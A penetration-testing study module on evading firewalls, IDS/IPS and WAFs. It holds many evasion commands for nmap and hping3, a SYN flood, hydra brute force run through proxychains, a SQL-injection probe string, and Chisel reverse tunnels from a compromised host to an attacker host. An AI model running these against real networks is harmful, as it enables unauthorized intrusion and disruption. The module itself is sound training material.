# 05 — PERIMETER DEFENSE EVASION

> **Author:** Zeeshan  
> **GitHub:** https://github.com/mzeeshanzafar28  
> **LinkedIn:** https://www.linkedin.com/in/mzeeshanzafar28

Perimeter defense evasion is the discipline of understanding, testing, and bypassing the controls that separate an attacker from protected network resources. In CPENT, you will encounter strict firewalls, IDS/IPS, and segmented networks. This module covers the techniques to probe, evade, and bypass each layer.

---

## Table of Contents

1. [The Perimeter Security Model](#1-the-perimeter-security-model)
2. [Firewall vs IDS vs IPS vs WAF](#2-firewall-vs-ids-vs-ips-vs-waf)
3. [Firewall Behavior Analysis](#3-firewall-behavior-analysis)
4. [DROP vs REJECT — Understanding Filtering](#4-drop-vs-reject--understanding-filtering)
5. [Nmap Filter Interpretation](#5-nmap-filter-interpretation)
6. [Wireshark for Firewall Analysis](#6-wireshark-for-firewall-analysis)
7. [Packet Manipulation & Evasion](#7-packet-manipulation--evasion)
8. [ProxyChains — Setup & Usage](#8-proxychains--setup--usage)
9. [HTTP Tunneling](#9-http-tunneling)
10. [IP Spoofing & Decoys](#10-ip-spoofing--decoys)
11. [Firewall Identification — firewalk & hping3](#11-firewall-identification--firewalk--hping3)
12. [IDS/IPS Evasion Techniques](#12-idsips-evasion-techniques)
13. [WAF Fingerprinting & Bypass](#13-waf-fingerprinting--bypass)
14. [IPv6 as a Security Boundary](#14-ipv6-as-a-security-boundary)
15. [Router & Switch Security Testing](#15-router--switch-security-testing)
16. [Practical Bypass Workflows](#16-practical-bypass-workflows)
17. [Tools & Techniques Mapping](#17-tools--techniques-mapping)
18. [Practice & Labs](#18-practice--labs)

---

## 1. The Perimeter Security Model

A simplified enterprise perimeter:

```
                         INTERNET
                            |
                            v
                     [ Edge Router ]
                            |
                            v
                      [ Firewall ]
                       /        \
                      /          \
                     v            v
                [ DMZ ]       [ Internal ]
                   |              |
             Web / Mail      Core Network
                                  |
                         +--------+--------+
                         |                 |
                       Users          Critical Assets
```

Additional controls may include:

```
WAF, IDS, IPS, NDR, Proxy, VPN gateway, NAC
Load balancer, Reverse proxy, Cloud firewall
Router ACLs, Switch ACLs, Network segmentation
```

**The tester's objective:**

```
What is exposed?      What is filtered?
What is allowed?      What is denied?
Where is each control located?
How does traffic traverse the controls?
Can an allowed path be abused?
Can a control be bypassed?
```

Do NOT begin with aggressive evasion. First understand normal behavior.

---

## 2. Firewall vs IDS vs IPS vs WAF

### Firewall
Controls traffic according to rules:
```
Source IP → Destination IP → Source Port → Destination Port → Protocol → Interface → Direction → Connection State → ACTION
```

### IDS (Intrusion Detection System)
Observes traffic and generates alerts. Does NOT block.
```
Traffic → [ IDS ] → Alert
```

### IPS (Intrusion Prevention System)
Can actively block or modify traffic.
```
Traffic → [ IPS ] → Allow / Block
```

### WAF (Web Application Firewall)
Application-layer (HTTP/HTTPS) filtering — Ports 80/443.
Inspects: URL, Headers, Cookies, Parameters, Request body, HTTP methods, Application patterns.

These controls are NOT interchangeable. A TCP/443 allowed through the firewall can still be blocked by the WAF.

---

## 3. Firewall Behavior Analysis

### 3.1 Methodology

```
1. Discover hosts (what responds?)
2. Identify exposed services (what ports respond?)
3. Identify filtering behavior (what's dropped vs rejected?)
4. Locate perimeter controls (which hop?)
5. Map allowed/denied traffic (matrix)
6. Identify firewall technology (vendor/version)
7. Test rule boundaries
8. Test segmentation
9. Test alternate paths (IPv6, source ports, DNS)
10. Validate bypass possibilities
```

### 3.2 Common Perimeter Ports (Know These)

| Port | Protocol/Service | Typical Relevance |
|---|---|---|
| 20/21 | FTP | File transfer; anonymous access |
| 22 | SSH | Remote administration |
| 23 | Telnet | Legacy admin (cleartext) |
| 25 | SMTP | Mail transfer; user enumeration |
| 53 | DNS | Name resolution; covert channel |
| 80 | HTTP | Web |
| 110 | POP3 | Mail retrieval |
| 123 | NTP | Time sync |
| 135 | MS RPC | Windows RPC endpoint mapper |
| 137-139 | NetBIOS | Windows networking |
| 143 | IMAP | Mail |
| 161/162 | SNMP | Network management |
| 389 | LDAP | Directory services |
| 443 | HTTPS | Secure web |
| 445 | SMB | Windows file/services |
| 514 | Syslog | Logging |
| 636 | LDAPS | LDAP over TLS |
| 1433 | MS SQL | Database |
| 1521 | Oracle | Database |
| 2049 | NFS | Network filesystem |
| 3306 | MySQL | Database |
| 3389 | RDP | Windows remote desktop |
| 5900 | VNC | Remote desktop |
| 8080/8443 | HTTP Proxy/Alt | Web apps |
| 502 | Modbus/TCP | OT/SCADA |

---

## 4. DROP vs REJECT — Understanding Filtering

### DROP — Firewall silently discards the packet
```
Client sends SYN → [Firewall DROPS] → Client experiences: TIMEOUT (no response)
```

### REJECT — Firewall actively informs the sender
```
Client sends SYN → [Firewall REJECTS] → Client receives: TCP RST or ICMP unreachable
```

This difference is critical during reconnaissance:
- **DROP** = harder to fingerprint, causes scan delays
- **REJECT** = gives away firewall presence immediately

---

## 5. Nmap Filter Interpretation

Nmap port states and what they mean:

| State | Meaning | Network Behavior |
|---|---|---|
| **open** | Service is listening | SYN → SYN-ACK |
| **closed** | Host reachable, port not listening | SYN → RST |
| **filtered** | Firewall/IDS blocking; cannot determine | SYN → nothing (or ICMP unreachable) |
| **open\|filtered** | No response (typical for UDP or XMAS/NULL/FIN) | Probe → nothing |
| **closed\|filtered** | Rare; IP ID unreachable | — |

**Important:** "closed" means "not this port" — move on. "filtered" means "something is actively hiding this port from you" — investigate with evasion techniques.

---

## 6. Wireshark for Firewall Analysis

### 6.1 Workflow

```
1. Start Wireshark capture on scanning interface
2. Run controlled Nmap scan
3. Filter and analyze
```

### 6.2 Display Filters

```
ip.addr == 192.168.1.10                      # All traffic to/from target
ip.src == 192.168.1.10                       # Only from target
ip.dst == 192.168.1.10                       # Only to target
tcp.port == 21                               # Specific port
tcp.port == 445                              # SMB
tcp.flags.syn == 1 && tcp.flags.ack == 0     # SYN only (initial)
tcp.flags.syn == 1 && tcp.flags.ack == 1     # SYN-ACK (response)
tcp.flags.reset == 1                         # RST packets
icmp                                        # All ICMP traffic
```

### 6.3 Packet-Level Interpretation

| Observed | Meaning |
|---|---|
| SYN → SYN-ACK → ACK | Port genuinely OPEN |
| SYN → RST | Port CLOSED |
| SYN → no response (no SYN-ACK, no RST) | Firewall/IDS DROPPING = FILTERED |
| SYN → ICMP unreachable | FILTERED (active rejection) |

---

## 7. Packet Manipulation & Evasion

### 7.1 Packet Fragmentation

Fragment packets to slip below inspection thresholds of naive packet-filtering devices.

```bash
# Simple fragmentation
sudo nmap -f 192.168.1.10

# Custom MTU (must be multiple of 8)
sudo nmap --mtu 24 192.168.1.10

# Compare results
sudo nmap -sS -p 22,80,443 192.168.1.10               # Normal
sudo nmap -f -sS -p 22,80,443 192.168.1.10             # Fragmented
sudo nmap --mtu 8 -sS -p 22,80,443 192.168.1.10       # 8-byte fragments (max fragmentation)
```

**How it works:** Splits the TCP header across packets so a filter that doesn't reassemble can't see the full port number. Modern devices reassemble — treat fragmentation success as a finding, not guaranteed.

### 7.2 Decoy Scanning

Flood the target with fake scan sources alongside your real IP.

```bash
# 5 random decoy IPs
sudo nmap -sS -D RND:5 192.168.1.10

# 10 random decoys
sudo nmap -sS -D RND:10 192.168.1.10

# Specific decoys with your real IP marked
sudo nmap -sS -D 10.0.0.1,10.0.0.2,ME,10.0.0.3,10.0.0.4 192.168.1.10
```

**Limitation:** Decoys do NOT make you invisible. They create noise. The target/IDS still sees your real IP.

### 7.3 Source Port Manipulation

Spoof source port to bypass rules trusting specific ports (DNS 53, HTTP 80, etc.).

```bash
# Source port 53 (DNS) — often allowed through weak firewalls
sudo nmap -sS --source-port 53 -p 22,80,443 192.168.1.10
sudo nmap -sS -g 53 -p 22,80,443 192.168.1.10          # -g is alias for --source-port

# Source port 80 (HTTP)
sudo nmap -sS --source-port 80 -p 22,80,443 192.168.1.10

# Source port 443 (HTTPS)
sudo nmap -sS --source-port 443 -p 22,80,443 192.168.1.10

# Compare with normal scan
sudo nmap -sS -p 22,80,443 192.168.1.10
```

If behavior changes (e.g., previously filtered ports become open), the firewall has a source-port-based rule — a finding worth reporting.

### 7.4 MAC Address Spoofing (Layer-2)

```bash
# Random MAC
sudo nmap --spoof-mac 0 192.168.1.10

# Vendor-specific random MAC
sudo nmap --spoof-mac Dell 192.168.1.10
sudo nmap --spoof-mac Cisco 192.168.1.10

# Specific MAC
sudo nmap --spoof-mac AA:BB:CC:DD:EE:FF 192.168.1.10
```

Only affects Layer-2 — useless for remote internet targets.

### 7.5 Timing Evasion

```bash
# Slow scans to evade rate-limiting IDS
sudo nmap -sS -T2 -p- 192.168.1.10            # Polite, serial probes
sudo nmap -sS -T1 -p 22,80,443 192.168.1.10    # Sneaky
sudo nmap -sS -T0 -p 22,80,443 192.168.1.10    # Paranoid (extremely slow)

# Custom delay between probes
sudo nmap --scan-delay 500ms 192.168.1.10
sudo nmap --scan-delay 1s 192.168.1.10
```

### 7.6 Data Length & Bad Checksum

```bash
# Append random data to evade signature-based IDS
sudo nmap --data-length 50 192.168.1.10
sudo nmap --data-length 200 192.168.1.10

# Bad checksum (some firewalls don't verify)
sudo nmap --badsum 192.168.1.10
```

### 7.7 Combined Evasion Example

```bash
# Layer multiple techniques
sudo nmap -sS -f --mtu 24 -D RND:3 --source-port 53 \
  --data-length 25 -T2 -p 22,80,443,445,3389 192.168.1.10
```

---

## 8. ProxyChains — Setup & Usage

ProxyChains forces TCP connections through a chain of SOCKS/HTTP proxies. Critical for pivoting and egress bypass.

### 8.1 Configuration

Edit `/etc/proxychains.conf`:

```bash
# /etc/proxychains.conf
# Chain type (dynamic_chain tries proxies in order; strict_chain requires all)
dynamic_chain

# Proxy DNS (prevents DNS leaks)
proxy_dns

# Add proxy entries at the bottom:
[ProxyList]
socks4 127.0.0.1 9050        # Tor
socks5 127.0.0.1 1080        # Custom SOCKS5 (e.g., Metasploit socks_proxy)
http 10.10.10.5 8080         # HTTP proxy
```

### 8.2 Usage

```bash
# Route nmap through proxies (MUST use -sT — connect scan)
sudo proxychains nmap -sT -Pn 192.168.1.10

# Route any TCP tool through proxies
sudo proxychains smbclient -L //192.168.1.10 -N
sudo proxychains hydra -l admin -P pass.txt ssh://192.168.1.10
sudo proxychains curl http://192.168.1.10

# Firefox through ProxyChains (browser SOCKS)
proxychains firefox
```

### 8.3 Critical Limitation

**ProxyChains only supports TCP CONNECT scans (`-sT`).** SYN scans (`-sS`) will NOT work because raw packet sockets can't be proxied.

### 8.4 Metasploit SOCKS Proxy Setup

```bash
# Inside msfconsole (after pivoting):
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j

# Now add to proxychains.conf:
# socks5 127.0.0.1 1080
```

---

## 9. HTTP Tunneling

When all TCP/UDP ports are blocked except HTTP/HTTPS, tunnel traffic through the allowed protocol.

### 9.1 Concept

```
Restricted Network → Allowed HTTP/HTTPS → [HTTP Tunnel] → Internal Destination
```

### 9.2 Legacy Tools (from CPENT notes)

- **HTTHost** — wraps traffic inside HTTP requests
- **HTTPort** — tunnels TCP over HTTP

These are legacy. Modern equivalents include Chisel, Ligolo-ng, and SSH tunneling.

### 9.3 Modern HTTP Tunnels

```bash
# Chisel (TCP over HTTP, secured with SSH)
# Attacker (server):
chisel server -p 8000 --reverse

# Compromised host (client):
chisel client attacker-ip:8000 R:socks

# Ligolo-ng (creates TUN interface for full Layer-3 routing)
# Allows nmap -sS through pivot! (no proxychains limitation)

# SSH dynamic tunneling
ssh -D 1080 user@pivot-host
# Then configure proxychains with socks5 127.0.0.1 1080
```

### 9.4 DNS as a Covert Channel

DNS (UDP/53, TCP/53) is often required for enterprise operation and may be poorly controlled:

```
Outbound DNS → Direct external DNS → Large DNS queries → DNS tunneling
```

Test whether outbound DNS is restricted, logged, or filtered.

---

## 10. IP Spoofing & Decoys

### 10.1 IP Spoofing

Spoofing your source IP mainly works for one-way probes — you won't see replies because they go to the spoofed address.

```bash
# hping3 with spoofed source IP (one-way probing)
sudo hping3 -S 192.168.1.10 -p 80 -a 10.0.0.99 -c 5

# Nmap decoys (your real IP is still sent; decoys create noise)
sudo nmap -sS -D RND:10 192.168.1.10
```

### 10.2 When IP Spoofing Is Useful

- **DoS testing** (one-way, don't need replies)
- **Idle/zombie scanning** (bounce off third-party)
- **Decoy flooding** (obfuscate real source among many)

---

## 11. Firewall Identification — firewalk & hping3

### 11.1 firewalk NSE Script

Firewalk attempts to determine which packets can traverse a Layer-3 device by probing with TTL-based techniques.

```bash
# Nmap Firewalk script
sudo nmap --script=firewalk --traceroute 192.168.1.10

# Locate the script
ls /usr/share/nmap/scripts/ | grep -i firewalk

# Run with specific gateway
sudo nmap --script=firewalk --script-args=firewalk.max-probes=10 192.168.1.10
```

### 11.2 hping3 — Manual Firewall Testing

hping3 is a powerful packet crafter for testing firewall behavior.

```bash
# SYN probe to specific port
sudo hping3 -S 192.168.1.10 -p 80 -c 5

# Incremental port sweep (inspect sport in responses)
sudo hping3 -S 192.168.1.10 -c 100 -p ++1

# ACK probe (test stateful vs stateless firewall)
# An ACK to a stateful firewall to an unsolicited connection = RST or drop
sudo hping3 -A 192.168.1.10 -p 80 -c 5

# SYN flood test (DOS — only in authorized lab)
sudo hping3 -S 192.168.1.10 -p 80 --flood

# Custom TTL (map where filtering starts)
sudo hping3 -S 192.168.1.10 -p 80 -c 1 -t 1   # TTL=1
sudo hping3 -S 192.168.1.10 -p 80 -c 1 -t 2   # TTL=2

# Specific interface
sudo hping3 -S 192.168.1.10 -p 80 -c 5 -I eth0

# Spoofed source IP
sudo hping3 -S 192.168.1.10 -p 80 -a 10.0.0.99 -c 5

# Random source port
sudo hping3 -S 192.168.1.10 -p 80 --rand-source -c 5

# Fragmented packets
sudo hping3 -S 192.168.1.10 -p 80 -c 5 -f
```

### 11.3 Traceroute-Based Firewall Location

```bash
# Standard traceroute
traceroute 192.168.1.10

# Nmap with traceroute
nmap --traceroute 192.168.1.10

# hping3 traceroute (UDP)
sudo hping3 --traceroute -S 192.168.1.10 -p 80
```

The hop where responses change (or stop) is often where the firewall sits.

---

## 12. IDS/IPS Evasion Techniques

### 12.1 Signature Evasion

Combine multiple techniques to avoid matching known signatures:

```bash
# Fragmentation + timing + data padding
sudo nmap -sS -f --mtu 24 -T2 --data-length 50 192.168.1.10

# Randomize host order and timing
sudo nmap -sS --randomize-hosts --scan-delay 200ms 192.168.1.0/24

# Use uncommon scan type
sudo nmap -sF -T2 192.168.1.10     # FIN scan
sudo nmap -sN -T2 192.168.1.10     # NULL scan
sudo nmap -sX -T2 192.168.1.10     # XMAS scan
```

### 12.2 Encoding & Normalization Gaps

```
Incoming Request → [IDS normalizes with Method A] → [Application normalizes with Method B]
If A ≠ B → detection gap
```

Common encoding evasion vectors:
```
URL encoding (%2e%2e%2f), Unicode representations, Case variation
Base64 obfuscation, HTTP chunking, Compression
```

### 12.3 Timing-Based Evasion

```bash
# Distribute probes across time windows
sudo nmap -sS -T1 --scan-delay 2s 192.168.1.10

# Manual staged scanning
nmap -sS -p 1-1000 192.168.1.10       # Day 1
nmap -sS -p 1001-2000 192.168.1.10    # Day 2
```

---

## 13. WAF Fingerprinting & Bypass

### 13.1 Fingerprinting a WAF

```bash
# WhatWeb
whatweb https://192.168.1.10
whatweb -v https://192.168.1.10    # Verbose

# Manual HTTP headers
curl -ik https://192.168.1.10/

# Look for WAF indicators:
# Server: cloudflare, AWSALB, __cfduid
# X-CDN, X-Cache, X-WAF-*
# Via: header
# Specific cookie names (e.g., citrix_ns_id, BIGipServer)

# Send benign malformed request
curl -ik 'https://192.168.1.10/?test=%27%22%3C%3E'
```

### 13.2 WAF Response Differential

Compare these requests and record: Status, Response length, Headers, Cookies, Latency, Body.

```bash
# Normal request (baseline)
curl -ik https://192.168.1.10/

# Malformed parameter
curl -ik 'https://192.168.1.10/?id=1%27%20OR%20%271%27=%271'

# Large header
curl -ik -H 'X-Test: AAAAAA[...]' https://192.168.1.10/

# Unknown path
curl -ik https://192.168.1.10/nonexistent-path-abc123/
```

### 13.3 Bypass Mindset

Don't think "find a magic option." Think:
```
What is allowed? → Why is it allowed? → Where is the enforcement point?
Can the same trusted path reach the target? → Is there another route?
Is filtering stateful or stateless? → Is filtering based on weak assumptions?
```

---

## 14. IPv6 as a Security Boundary

A common mistake: securing IPv4 while forgetting IPv6.

```bash
# Is IPv6 enabled on the target?
nmap -6 2001:db8::1

# IPv6 host discovery
nmap -6 -sn 2001:db8::/64

# Full IPv6 port scan
sudo nmap -6 -sS -p- 2001:db8::1

# IPv6 with evasion
sudo nmap -6 -sS -f --source-port 53 2001:db8::1
```

Questions to ask:
```
Is IPv6 enabled? Is it routed? Are ACLs applied?
Are firewall rules mirrored for IPv6? Are management services listening on IPv6?
```

A forgotten IPv6 path can effectively bypass an IPv4-only perimeter policy.

---

## 15. Router & Switch Security Testing

### 15.1 Router Testing

```bash
# Discover and fingerprint router
sudo nmap -sS -sV -p- ROUTER_IP

# Focus on management services
sudo nmap -sS -p 22,23,80,443,161 -sV ROUTER_IP

# SNMP enumeration
sudo nmap -sU -p 161 --script snmp-info,snmp-brute ROUTER_IP

# Check for Telnet (high-priority finding — cleartext admin)
nmap -sS -p 23 -sV ROUTER_IP
```

Common router misconfigurations:
```
Default credentials, Telnet enabled, HTTP management (no HTTPS)
Internet-facing management, Overly broad ACLs
SNMP community strings (public/private), Missing firmware updates
```

### 15.2 OSPF Testing

OSPF (Open Shortest Path First) is called out specifically in CPENT.

```
OSPF Concepts: Area 0 (backbone), Router ID, LSA, Adjacency, Neighbor, DR/BDR
Security: Authentication, Neighbor relationships, Passive interfaces, Route filtering
```

ODL: Area 0 is the backbone. Other areas connect through it.

### 15.3 Switch Security

Key concerns: VLANs, Trunks (802.1Q), STP, MAC tables, Port security, DHCP snooping, Dynamic ARP Inspection, 802.1X.

---

## 16. Practical Bypass Workflows

### 16.1 Basic Firewall Assessment

```bash
TARGET="192.168.1.10"

# Step 1: ICMP blocked?
ping -c 3 $TARGET
nmap -sn $TARGET

# Step 2: Alternative discovery
sudo nmap -PP -sn $TARGET
sudo nmap -PM -sn $TARGET
sudo nmap -PS22,80,443 -sn $TARGET
sudo nmap -PA80,443 -sn $TARGET
sudo nmap -PU53 -sn $TARGET

# Step 3: If still no response, force port scan
sudo nmap -Pn -sS -p 22,80,443,445,3389 $TARGET -oA firewall-test

# Step 4: Check for source-port trust
sudo nmap -Pn -sS --source-port 53 -p 22,80,443 $TARGET

# Step 5: Packet-level verification
# (Run in Wireshark simultaneously)
```

### 16.2 Aggressive Evasion Workflow

```bash
TARGET="192.168.1.10"

# Try fragmentation
sudo nmap -Pn -f -sS -p 22,80,443 $TARGET

# Try MTU manipulation
sudo nmap -Pn --mtu 24 -sS -p 22,80,443 $TARGET

# Try decoys (noise flooding)
sudo nmap -Pn -sS -D RND:5 -p 22,80,443 $TARGET

# Try source port + fragmentation combination
sudo nmap -Pn -sS --source-port 53 --mtu 24 -p 22,80,443 $TARGET

# Try firewalk
sudo nmap --script=firewalk --traceroute $TARGET

# Try hping3 incremental sweep
sudo hping3 -S $TARGET -c 50 -p ++1

# Try slow timing
sudo nmap -Pn -sS -T1 --scan-delay 2s -p 22,80,443 $TARGET

# If all fails, try IPv6
nmap -6 -Pn -sS $TARGET
```

### 16.3 ProxyChains Through Pivot

```bash
# 1. Set up SOCKS proxy (e.g., Metasploit, Chisel, SSH -D)
# 2. Configure /etc/proxychains.conf with socks5 127.0.0.1 <PORT>
# 3. Scan through proxy

sudo proxychains nmap -sT -Pn 192.168.1.10 -p 22,80,443,445
sudo proxychains nmap -sT -Pn -p- 192.168.1.10 --min-rate 500
```

### 16.4 HTTP Tunneling Through Firewall

```bash
# If only HTTP/HTTPS egress is allowed:

# Option A: SSH over HTTPS (if SSH is not blocked on 443)
ssh -p 443 user@pivot-host -D 1080

# Option B: Chisel (HTTP tunnel)
# On attacker (server):
chisel server -p 443 --reverse
# On compromised host (client):
chisel client attacker-ip:443 R:socks

# Then:
proxychains nmap -sT -Pn internal-target
```

---

## 17. Tools & Techniques Mapping

| Technique | Primary Tool | Example Command |
|---|---|---|
| **Firewall Detection** | nmap + Wireshark | `nmap -Pn -sS -p 22,80,443 TARGET` |
| **Packet Fragmentation** | nmap | `sudo nmap -f --mtu 24 TARGET` |
| **Decoy Scanning** | nmap | `sudo nmap -sS -D RND:5 TARGET` |
| **Source Port Spoofing** | nmap | `sudo nmap --source-port 53 TARGET` |
| **MAC Spoofing** | nmap | `sudo nmap --spoof-mac 0 TARGET` |
| **TCP Flag Manipulation** | nmap | `sudo nmap -sX/-sN/-sF TARGET` |
| **Timing Evasion** | nmap | `nmap -T2 --scan-delay 500ms TARGET` |
| **Firewall ACL Mapping** | nmap firewalk | `sudo nmap --script=firewalk --traceroute TARGET` |
| **Manual Packet Crafting** | hping3 | `sudo hping3 -S TARGET -p ++1 -c 100` |
| **Proxy Routing** | proxychains | `proxychains nmap -sT -Pn TARGET` |
| **HTTP Tunneling** | Chisel / SSH | `chisel server -p 443 --reverse` |
| **WAF Fingerprinting** | whatweb / curl | `whatweb -v https://TARGET` |
| **IPv6 Scanning** | nmap | `nmap -6 -sS TARGET` |

---

## 18. Practice & Labs

- **TryHackMe:** "Firewalls", "Wireshark: Traffic Analysis", "Firewalls and Proxies", "Wreath" (for pivoting + proxychains)
- **Local lab:** pfSense or iptables VM between attacker and target. Practice evasion and Wireshark verification against real filtering.
- **HackTheBox:** Pro Labs (Dante, Zephyr) — one of the best environments for practicing firewall evasion + pivoting
- **Self-Check:** Can you identify whether a target has a firewall, what type, which ports are filtered vs. closed, and attempt at least 3 different bypass techniques?

---

> **Previous Module:** [04 — Network Pentesting (External)](04-NETWORK-PENTESTING.md)
